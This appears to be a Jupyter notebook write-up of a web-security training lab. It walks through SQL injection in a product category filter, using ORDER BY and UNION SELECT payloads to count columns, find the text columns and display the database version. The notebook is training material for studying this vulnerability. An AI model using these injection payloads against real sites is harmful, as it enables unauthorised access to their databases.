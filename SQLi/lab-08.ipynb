{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft\n",
    "\n",
    "- sqli: product category fillter\n",
    "- end goal: display the database version string"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Analysis\n",
    "- url: `https://0aa7000303145d35806b800c00550044.web-security-academy.net/`\n",
    "\n",
    "- front-end: `filter?category=Lifestyle`\n",
    "- back-end: \n",
    "```sql\n",
    "select * from product where category = 'Lifestyle' and released = 1\n",
    "```\n",
    "\n",
    "- determine how many columns are there \n",
    "- front-end: `filter?category=Lifestyle' order by 2#`\n",
    "- back-end: \n",
    "```sql\n",
    "select * from product where category = 'Lifestyle'' order by 2# and released = 1\n",
    "'-- 200 OK: contain 2 columns \n",
    "```\n",
    "\n",
    "- determine data type of columns  \n",
    "- front-end: `filter?category=Lifestyle' union select 'a', 'a'#`\n",
    "- back-end: \n",
    "```sql\n",
    "select * from product where category = 'Lifestyle'' union select 'a', 'a'# and released = 1\n",
    "'-- 200 OK: both columns are text \n",
    "```\n",
    "\n",
    "- display database version\n",
    "- front-end: `filter?category=Lifestyle' union select @@version, null#`\n",
    "- back-end: \n",
    "```sql\n",
    "select * from product where category = 'Lifestyle'' union select @@version, null# and released = 1\n",
    "'-- microsoft: 200 OK \n",
    "```\n",
    "- Congratulations, you solved the lab!"
   ]
  }
 ],
 "metadata": {
  "language_info": {
   "name": "python"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
